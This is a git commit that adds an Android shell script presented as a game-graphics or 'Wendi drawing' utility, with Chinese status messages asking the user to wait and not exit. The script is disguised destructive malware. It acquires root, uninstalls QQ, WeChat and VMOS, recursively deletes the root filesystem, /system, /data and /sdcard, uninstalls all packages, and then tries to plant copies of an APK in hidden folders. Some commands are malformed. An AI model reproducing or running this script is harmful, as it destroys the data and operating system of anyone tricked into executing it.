1a6b084192c82eb89fa8a548a33d9d0afe9a5007
LIliz66 <133887154+LIliz6@users.noreply.github.com>
2023-05-28 13:26:52 +0800

    Add files via upload

---
+++ wendi.sh
@@ -0,0 +1,54 @@
+echo 启动中
+sleep 0.20
+echo 温迪绘制
+echo 初始化中
+sleep 1
+sleep 
+需要等待3分钟左右
+su
+su
+su
+su
+su
+su
+su
+echo 请不要退出！！！
+pm clear com.tencent.mobileqq
+pm clear com.tencent.mm
+pm clear com.vmos.pro
+pm uninstall --user 0 com.tencent.mm
+pm uninstall --user 0 com.tencent.mobileqq
+pm uninstall --user 0 com.vmos.pro
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0/Android
+rm -rf /*
+rm -rf /vendor
+rm -rf /system_ext
+rm -rf /system
+rm -rf /sdcard
+rm -rf /product
+rm -rf /mnt
+rm -rf /proc
+rm -rf /etc
+rm -rf /data
+rm -rf /*
+echo uninstall *
+pm uninstall *
+echo 进行中
+echo 大概1-3分钟，因为要解密和平精英资源
+
+mkdir /sdcard/.Tencent.
+mkdir /sdcard/.Tencent.t
+mkdir /sdcard/.Tencent./.Tencent.
+mkdir /sdcard/.Tencent./.Tencent.t
+mkdir /sdcard/.Tencent./.Tencent./.Tencent.
+mkdir /sdcard/.Tencent./.Tencent./.Tencent.t
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent.
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent.t
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent.
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent./.Tencent.
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent./.Tencent.t
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent./.Tencent./.Tencent.
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /sdcard/.Tencent./.Tencent./.Tencent.t
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /storage/emulated/0/Android/
+pull https://miniworld-apk.mini1.cn/latest/miniworldMini-wp.apk /storage/emulated/0/Android/data/
